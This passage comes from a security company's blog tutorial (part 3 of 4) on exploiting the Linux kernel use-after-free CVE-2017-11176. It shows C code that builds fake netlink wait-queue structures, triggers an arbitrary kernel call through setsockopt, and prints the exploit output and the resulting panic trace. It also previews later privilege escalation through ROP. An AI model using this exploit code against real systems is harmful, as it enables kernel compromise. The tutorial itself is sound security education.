<span class="cp">#define WQ_FLAG_EXCLUSIVE 0x01</span>
<span class="w">  </span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="n">private</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="n">wait_queue_func_t</span><span class="w"> </span><span class="n">func</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="k">struct</span> <span class="nc">list_head</span><span class="w"> </span><span class="n">task_list</span><span class="p">;</span><span class="w"></span>
<span class="p">};</span><span class="w"></span>
</code></pre></div><p>That's it!</p><p>On the other hand, if you would like to mimic <em>netlink_sock</em>, you would need to insert some <em>padding</em> to have the correct layout, or worst, re-implement all the "embedded" structures... We won't do it here since we only want to reference the "wait" field and the "pid" and "groups" fields (for the reallocation checker).</p><h2 id="finalize-the-reallocation-data">Finalize The Reallocation Data</h2><p>Alright, now that we have our structure, let's declare the userland wait queue element and the "fake" next element globally:</p><div class="highlight"><pre><span></span><code><span class="k">static</span><span class="w"> </span><span class="k">volatile</span><span class="w"> </span><span class="k">struct</span> <span class="nc">wait_queue</span><span class="w"> </span><span class="n">g_uland_wq_elt</span><span class="p">;</span><span class="w"></span>
<span class="k">static</span><span class="w"> </span><span class="k">volatile</span><span class="w"> </span><span class="k">struct</span> <span class="nc">list_head</span><span class="w">  </span><span class="n">g_fake_next_elt</span><span class="p">;</span><span class="w"></span>
</code></pre></div><p>And finalize the reallocation data content:</p><div class="highlight"><pre><span></span><code><span class="cp">#define PANIC_ADDR ((void*) 0xffffffff81553684)</span>

<span class="k">static</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="nf">init_realloc_data</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span><span class="w"></span>
<span class="p">{</span><span class="w"></span>
<span class="w">  </span><span class="k">struct</span> <span class="nc">cmsghdr</span><span class="w"> </span><span class="o">*</span><span class="n">first</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="kt">int</span><span class="o">*</span><span class="w"> </span><span class="n">pid</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">int</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">g_realloc_data</span><span class="p">[</span><span class="n">NLK_PID_OFFSET</span><span class="p">];</span><span class="w"></span>
<span class="w">  </span><span class="kt">void</span><span class="o">**</span><span class="w"> </span><span class="n">groups</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">void</span><span class="o">**</span><span class="p">)</span><span class="o">&amp;</span><span class="n">g_realloc_data</span><span class="p">[</span><span class="n">NLK_GROUPS_OFFSET</span><span class="p">];</span><span class="w"></span>
<span class="w">  </span><span class="k">struct</span> <span class="nc">wait_queue_head</span><span class="w"> </span><span class="o">*</span><span class="n">nlk_wait</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="k">struct</span> <span class="nc">wait_queue_head</span><span class="o">*</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;</span><span class="n">g_realloc_data</span><span class="p">[</span><span class="n">NLK_WAIT_OFFSET</span><span class="p">];</span><span class="w"></span>

<span class="w">  </span><span class="n">memset</span><span class="p">((</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span><span class="n">g_realloc_data</span><span class="p">,</span><span class="w"> </span><span class="sc">'A'</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">g_realloc_data</span><span class="p">));</span><span class="w"></span>

<span class="w">  </span><span class="c1">// necessary to pass checks in __scm_send()</span>
<span class="w">  </span><span class="n">first</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="k">struct</span> <span class="nc">cmsghdr</span><span class="o">*</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;</span><span class="n">g_realloc_data</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="n">first</span><span class="o">-&gt;</span><span class="n">cmsg_len</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">g_realloc_data</span><span class="p">);</span><span class="w"></span>
<span class="w">  </span><span class="n">first</span><span class="o">-&gt;</span><span class="n">cmsg_level</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="c1">// must be different than SOL_SOCKET=1 to "skip" cmsg</span>
<span class="w">  </span><span class="n">first</span><span class="o">-&gt;</span><span class="n">cmsg_type</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span><span class="w"> </span><span class="c1">// &lt;---- ARBITRARY VALUE</span>

<span class="w">  </span><span class="c1">// used by reallocation checker</span>
<span class="w">  </span><span class="o">*</span><span class="n">pid</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">MAGIC_NL_PID</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="o">*</span><span class="n">groups</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">MAGIC_NL_GROUPS</span><span class="p">;</span><span class="w"></span>

<span class="w">  </span><span class="c1">// the first element in nlk's wait queue is our userland element (task_list field!)</span>
<span class="w">  </span><span class="n">BUILD_BUG_ON</span><span class="p">(</span><span class="n">offsetof</span><span class="p">(</span><span class="k">struct</span> <span class="nc">wait_queue_head</span><span class="p">,</span><span class="w"> </span><span class="n">task_list</span><span class="p">)</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="n">WQ_HEAD_TASK_LIST_OFFSET</span><span class="p">);</span><span class="w"></span>
<span class="w">  </span><span class="n">nlk_wait</span><span class="o">-&gt;</span><span class="n">slock</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="n">nlk_wait</span><span class="o">-&gt;</span><span class="n">task_list</span><span class="p">.</span><span class="n">next</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="k">struct</span> <span class="nc">list_head</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">g_uland_wq_elt</span><span class="p">.</span><span class="n">task_list</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="n">nlk_wait</span><span class="o">-&gt;</span><span class="n">task_list</span><span class="p">.</span><span class="n">prev</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="k">struct</span> <span class="nc">list_head</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">g_uland_wq_elt</span><span class="p">.</span><span class="n">task_list</span><span class="p">;</span><span class="w"></span>

<span class="w">  </span><span class="c1">// initialise the "fake" second element (because of list_for_each_entry_safe())</span>
<span class="w">  </span><span class="n">g_fake_next_elt</span><span class="p">.</span><span class="n">next</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="k">struct</span> <span class="nc">list_head</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">g_fake_next_elt</span><span class="p">;</span><span class="w"> </span><span class="c1">// point to itself</span>
<span class="w">  </span><span class="n">g_fake_next_elt</span><span class="p">.</span><span class="n">prev</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="k">struct</span> <span class="nc">list_head</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">g_fake_next_elt</span><span class="p">;</span><span class="w"> </span><span class="c1">// point to itself</span>

<span class="w">  </span><span class="c1">// initialise the userland wait queue element</span>
<span class="w">  </span><span class="n">BUILD_BUG_ON</span><span class="p">(</span><span class="n">offsetof</span><span class="p">(</span><span class="k">struct</span> <span class="nc">wait_queue</span><span class="p">,</span><span class="w"> </span><span class="n">func</span><span class="p">)</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="n">WQ_ELMT_FUNC_OFFSET</span><span class="p">);</span><span class="w"></span>
<span class="w">  </span><span class="n">BUILD_BUG_ON</span><span class="p">(</span><span class="n">offsetof</span><span class="p">(</span><span class="k">struct</span> <span class="nc">wait_queue</span><span class="p">,</span><span class="w"> </span><span class="n">task_list</span><span class="p">)</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="n">WQ_ELMT_TASK_LIST_OFFSET</span><span class="p">);</span><span class="w"></span>
<span class="w">  </span><span class="n">g_uland_wq_elt</span><span class="p">.</span><span class="n">flags</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">WQ_FLAG_EXCLUSIVE</span><span class="p">;</span><span class="w"> </span><span class="c1">// set to exit after the first arbitrary call</span>
<span class="w">  </span><span class="n">g_uland_wq_elt</span><span class="p">.</span><span class="n">private</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">NULL</span><span class="p">;</span><span class="w"> </span><span class="c1">// unused</span>
<span class="w">  </span><span class="n">g_uland_wq_elt</span><span class="p">.</span><span class="n">func</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">wait_queue_func_t</span><span class="p">)</span><span class="w"> </span><span class="n">PANIC_ADDR</span><span class="p">;</span><span class="w"> </span><span class="c1">// &lt;----- arbitrary call! </span>
<span class="w">  </span><span class="n">g_uland_wq_elt</span><span class="p">.</span><span class="n">task_list</span><span class="p">.</span><span class="n">next</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="k">struct</span> <span class="nc">list_head</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">g_fake_next_elt</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="n">g_uland_wq_elt</span><span class="p">.</span><span class="n">task_list</span><span class="p">.</span><span class="n">prev</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="k">struct</span> <span class="nc">list_head</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">g_fake_next_elt</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">"[+] g_uland_wq_elt addr = %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">g_uland_wq_elt</span><span class="p">);</span><span class="w"></span>
<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">"[+] g_uland_wq_elt.func = %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="w"> </span><span class="n">g_uland_wq_elt</span><span class="p">.</span><span class="n">func</span><span class="p">);</span><span class="w"></span>

<span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>
<span class="p">}</span><span class="w"></span>
</code></pre></div><p>See how this is less <em>error-prone</em> than hardcoded offset?</p><p>The reallocation data layout becomes:</p><p></p><figure><img src="./2018 - CVE-2017-11176 A step-by-step Linux Kernel exploitation part 3_files/realloc_final.png" title="Reallocation Final"><figcaption class="figcaption figure-caption text-center">realloc_final</figcaption></figure><p></p><p>Nice, we are done with reallocation data now! :-)</p><h2 id="trigger-the-arbitrary-call-primitive">Trigger The Arbitrary Call Primitive</h2><p>Finally, we need to trigger the arbitrary call primitive from the main thread. Since we already know that path from part 2, the following code should be pretty straightforward:</p><div class="highlight"><pre><span></span><code><span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span><span class="w"></span>
<span class="p">{</span><span class="w"></span>
<span class="w">  </span><span class="c1">// ... cut ...</span>

<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">"[+] reallocation succeed! Have fun :-)</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span><span class="w"></span>

<span class="w">  </span><span class="c1">// trigger the arbitrary call primitive</span>
<span class="w">  </span><span class="n">val</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">3535</span><span class="p">;</span><span class="w"> </span><span class="c1">// need to be different than zero</span>
<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">_setsockopt</span><span class="p">(</span><span class="n">unblock_fd</span><span class="p">,</span><span class="w"> </span><span class="n">SOL_NETLINK</span><span class="p">,</span><span class="w"> </span><span class="n">NETLINK_NO_ENOBUFS</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">val</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">val</span><span class="p">)))</span><span class="w"></span>
<span class="w">  </span><span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="n">perror</span><span class="p">(</span><span class="s">"[-] setsockopt"</span><span class="p">);</span><span class="w"></span>
<span class="w">    </span><span class="k">goto</span><span class="w"> </span><span class="n">fail</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="p">}</span><span class="w"></span>

<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">"[ ] are we still alive ?</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span><span class="w"></span>
<span class="w">  </span><span class="n">PRESS_KEY</span><span class="p">();</span><span class="w"></span>

<span class="w">  </span><span class="c1">// ... cut ...</span>
<span class="p">}</span><span class="w"></span>
</code></pre></div><h2 id="exploit-results">Exploit Results</h2><p>It is time to launch the exploit and see if it works! Because the kernel crashes, you might not have the time to see the <em>dmesg</em> output from your virtual machine. It is highly recommended to use <a href="https://www.kernel.org/doc/Documentation/networking/netconsole.txt">netconsole</a>!</p><p>Let's launch the exploit:</p><div class="highlight"><pre><span></span><code>[ ] -={ CVE-2017-11176 Exploit }=-
[+] successfully migrated to CPU#0
[ ] optmem_max = 20480
[+] can use the 'ancillary data buffer' reallocation gadget!
[+] g_uland_wq_elt addr = 0x602820
[+] g_uland_wq_elt.func = 0xffffffff81553684
[+] reallocation data initialized!
[ ] initializing reallocation threads, please wait...
[+] 300 reallocation threads ready!
[+] reallocation ready!
[ ] preparing blocking netlink socket
[+] socket created (send_fd = 603, recv_fd = 604)
[+] netlink socket bound (nl_pid=118)
[+] receive buffer reduced
[ ] flooding socket
[+] flood completed
[+] blocking socket ready
[+] netlink socket created = 604
[+] netlink fd duplicated (unblock_fd=603, sock_fd2=605)
[ ] creating unblock thread...
[+] unblocking thread has been created!
[ ] get ready to block
[ ][unblock] closing 604 fd
[ ][unblock] unblocking now
[+] mq_notify succeed
[ ] creating unblock thread...
[+] unblocking thread has been created!
[ ] get ready to block
[ ][unblock] closing 605 fd
[ ][unblock] unblocking now
[+] mq_notify succeed
</code></pre></div><p><strong>NOTE</strong>: We don't see the "reallocation succeed" string because the kernel crashes before dumping it to the console (it is buffered however).</p><p>And the <em>netconsole</em> result:</p><div class="highlight"><pre><span></span><code>[  213.352742] Freeing alive netlink socket ffff88001bddb400
[  218.355229] Kernel panic - not syncing: ^A
[  218.355434] Pid: 2443, comm: exploit Not tainted 2.6.32
[  218.355583] Call Trace:
[  218.355689]  [&lt;ffffffff8155372b&gt;] ? panic+0xa7/0x179
[  218.355927]  [&lt;ffffffff810665b3&gt;] ? __wake_up+0x53/0x70
[  218.356045]  [&lt;ffffffff81061909&gt;] ? __wake_up_common+0x59/0x90
[  218.356156]  [&lt;ffffffff810665a8&gt;] ? __wake_up+0x48/0x70
[  218.356310]  [&lt;ffffffff814b81cc&gt;] ? netlink_setsockopt+0x13c/0x1c0
[  218.356460]  [&lt;ffffffff81475a2f&gt;] ? sys_setsockopt+0x6f/0xc0
[  218.356622]  [&lt;ffffffff8100b1a2&gt;] ? system_call_fastpath+0x16/0x1b
</code></pre></div><p><strong>VICTORY!</strong> We successfully called <em>panic()</em> from <em>netlink_setsockopt()</em>!</p><p><strong>We are now controlling the Kernel Execution Flow! The <em>arbitrary call primitive</em> has been exploited. :-)</strong></p><hr><h1 id="conclusion">Conclusion</h1><p><em>Wow... It was a long run!</em></p><p>In this article we saw lots of things. First, we introduced the memory subsystem while focusing on the SLAB allocator. In addition, we saw a critical data structure used all over the place in the kernel (<em>list_head</em>) as well as the <em>container_of()</em> macro.</p><p>Secondly, we saw what was <em>use-after-free</em> bug and the general strategy to exploit them with <em>type confusion</em> in the Linux kernel. We emphasized the general information required to gather before trying to exploit it and saw that KASAN can automate this laborious task. We gathered information for our specific bug and exposed several methods to statically or dynamically find the cache object size (pahole, /proc/slabinfo, ...).</p><p>Thirdly, we covered how to do reallocation in the Linux Kernel using the <em>well-known</em> "ancillary data buffer" gadget (<em>sendmsg()</em>), saw what was controllable and how to use it to reallocate with (almost) arbitrary content. The implementation showed two simple tricks to minimize reallocation failure (cpumask and heap spraying).</p><p>Finally, we exposed where all our <em>uaf primitives</em> were (the primitive gates). We used one to check the reallocation status (uncontrolled read) and another (from wait queue) to gain an arbitrary call. The implementation mimicked the kernel data structure and we extracted our target specific offset from assembly. In the end, the current exploit is able to call <em>panic()</em>, hence we gained control over the kernel execution flow.</p><p>In the next (and final) article, we will see how to use this arbitrary call primitive to take over ring-0 using <em>stack pivot</em> and <em>ROP chain</em>. Unlike userland ROP exploitation, the kernel version has some extra requirements and issues to consider (page faults, SMEP) that we will overcome. In the end, we will repair the kernel so that it does not crash when the exploit exits and elevates our privileges.</p><p>Hope you enjoy this journey in the Linux kernel and see you in <a href="https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part4.html">part 4</a>.</p></div><div class="blog-post-meta mt-4"><div class="share" id="post-share-links"><div class="share-twitter"><a href="https://twitter.com/intent/tweet?text=CVE-2017-11176%3A%20A%20step-by-step%20Linux%20Kernel%20exploitation%20%28part%203/4%29&amp;url=https%3A//blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part3.html" rel="nofollow noopener" target="_blank"><span><svg aria-hidden="true" class="svg-inline--fa fa-twitter fa-w-16" data-prefix="fab" data-icon="twitter" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" data-fa-i2svg=""><path fill="currentColor" d="M459.37 151.716c.325 4.548.325 9.097.325 13.645 0 138.72-105.583 298.558-298.558 298.558-59.452 0-114.68-17.219-161.137-47.106 8.447.974 16.568 1.299 25.34 1.299 49.055 0 94.213-16.568 130.274-44.832-46.132-.975-84.792-31.188-98.112-72.772 6.498.974 12.995 1.624 19.818 1.624 9.421 0 18.843-1.3 27.614-3.573-48.081-9.747-84.143-51.98-84.143-102.985v-1.299c13.969 7.797 30.214 12.67 47.431 13.319-28.264-18.843-46.781-51.005-46.781-87.391 0-19.492 5.197-37.36 14.294-52.954 51.655 63.675 129.3 105.258 216.365 109.807-1.624-7.797-2.599-15.918-2.599-24.04 0-57.828 46.782-104.934 104.934-104.934 30.213 0 57.502 12.67 76.67 33.137 23.715-4.548 46.456-13.32 66.599-25.34-7.798 24.366-24.366 44.833-46.132 57.827 21.117-2.273 41.584-8.122 60.426-16.243-14.292 20.791-32.161 39.308-52.628 54.253z"></path></svg><!-- <i aria-hidden="true" class="fab fa-twitter"></i> -->Tweet</span></a></div><div class="share-facebook"><a href="http://www.facebook.com/sharer/sharer.php?u=https%3A//blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part3.html" rel="nofollow noopener" target="_blank"><span><svg aria-hidden="true" class="svg-inline--fa fa-facebook fa-w-14" data-prefix="fab" data-icon="facebook" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" data-fa-i2svg=""><path fill="currentColor" d="M448 56.7v398.5c0 13.7-11.1 24.7-24.7 24.7H309.1V306.5h58.2l8.7-67.6h-67v-43.2c0-19.6 5.4-32.9 33.5-32.9h35.8v-60.5c-6.2-.8-27.4-2.7-52.2-2.7-51.6 0-87 31.5-87 89.4v49.9h-58.4v67.6h58.4V480H24.7C11.1 480 0 468.9 0 455.3V56.7C0 43.1 11.1 32 24.7 32h398.5c13.7 0 24.8 11.1 24.8 24.7z"></path></svg><!-- <i aria-hidden="true" class="fab fa-facebook"></i> -->Share</span></a></div><div class="share-linkedin"><a href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3A//blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part3.html&amp;title=CVE-2017-11176%3A%20A%20step-by-step%20Linux%20Kernel%20exploitation%20%28part%203/4%29&amp;summary=The%20third%20article%20covers%20use-after-free%20exploitation.%20Starting%20from%20the%20PoC%2C%20it%20will%20explain%20what%20is%20needed%20to%20exploit%20UAF%20in%20ring-0%2C%20how%20to%20do%20a%20reallocation%20and%20gain%20an%20arbitrary%20call%20primitive.%20The%20core%20concept%20section%20focuses%20on%20the%20memory%20management%20subsystem%20%28SLAB%20allocator%29.&amp;source=https%3A//blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part3.html" rel="nofollow noopener" target="_blank"><span><svg aria-hidden="true" class="svg-inline--fa fa-linkedin fa-w-14" data-prefix="fab" data-icon="linkedin" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" data-fa-i2svg=""><path fill="currentColor" d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5 0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9V416z"></path></svg><!-- <i aria-hidden="true" class="fab fa-linkedin"></i> -->Share</span></a></div><div class="share-email"><a href="mailto:?subject=CVE-2017-11176%3A%20A%20step-by-step%20Linux%20Kernel%20exploitation%20%28part%203/4%29&amp;body=https%3A//blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part3.html" rel="nofollow noopener" target="_blank"><span><svg aria-hidden="true" class="svg-inline--fa fa-envelope fa-w-16" data-prefix="far" data-icon="envelope" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" data-fa-i2svg=""><path fill="currentColor" d="M464 64H48C21.49 64 0 85.49 0 112v288c0 26.51 21.49 48 48 48h416c26.51 0 48-21.49 48-48V112c0-26.51-21.49-48-48-48zm0 48v40.805c-22.422 18.259-58.168 46.651-134.587 106.49-16.841 13.247-50.201 45.072-73.413 44.701-23.208.375-56.579-31.459-73.413-44.701C106.18 199.465 70.425 171.067 48 152.805V112h416zM48 400V214.398c22.914 18.251 55.409 43.862 104.938 82.646 21.857 17.205 60.134 55.186 103.062 54.955 42.717.231 80.509-37.199 103.053-54.947 49.528-38.783 82.032-64.401 104.947-82.653V400H48z"></path></svg><!-- <i aria-hidden="true" class="far fa-envelope"></i> -->Share</span></a></div></div></div></div></article></div></main><footer class="container-fluid bg-white"><div class="row py-2" style="background-color: rgb(179,32,39);"><div class="col-12 text-center footer-text"><h3 class="text-light">LEXFO - Because information security is essential</h3></div></div><div class="row"><div class="col-12 text-center mt-3"><h3 class="txtcenter">Contact us</h3></div></div><div class="row mt-3"><div class="col-sm-3 text-center"><img alt="Adresse" class="mb-2" src="./2018 - CVE-2017-11176 A step-by-step Linux Kernel exploitation part 3_files/map.png"><h4>Our address</h4><address><p>5, rue Drouot<br> 75009 PARIS, FRANCE</p></address></div><div class="col-sm-3 text-center"><img alt="Email" class="mb-2" src="./2018 - CVE-2017-11176 A step-by-step Linux Kernel exploitation part 3_files/email.png"><h4>By email</h4><p>contact [at] lexfo [dot] fr</p></div><div class="col-sm-3 text-center"><img alt="Tlphone" class="mb-2" src="./2018 - CVE-2017-11176 A step-by-step Linux Kernel exploitation part 3_files/tel.png"><h4>By phone</h4><p>+33 1 40 17 91 28</p></div><div class="col-sm-3 text-center"><a href="https://twitter.com/LexfoSecurite" style="background: transparent;"><img alt="@LexfoSecurite, Lexfo&#39;s twitter account" class="mb-2" src="./2018 - CVE-2017-11176 A step-by-step Linux Kernel exploitation part 3_files/twitter.png"></a><h4>On Twitter</h4><p><a href="https://twitter.com/LexfoSecurite">@LexfoSecurite</a></p></div></div><div class="row mt-1"><div class="col-12 text-center"><p><a href="https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part3.html#logo">Back to the top</a></p></div></div><div class="row mt-1"><div class="col-12 text-center"><p> LEXFO 2020 - All rights reserved</p></div></div></footer><script src="./2018 - CVE-2017-11176 A step-by-step Linux Kernel exploitation part 3_files/packed.js."></script><script src="./2018 - CVE-2017-11176 A step-by-step Linux Kernel exploitation part 3_files/all.min.js."></script><script>
               $(document).ready(function () { $("table").attr("class","table table-condensed table-bordered"); });
               $(document).ready(function () { $("figcaption").attr("class","figcaption figure-caption text-center"); });
        </script></body></html>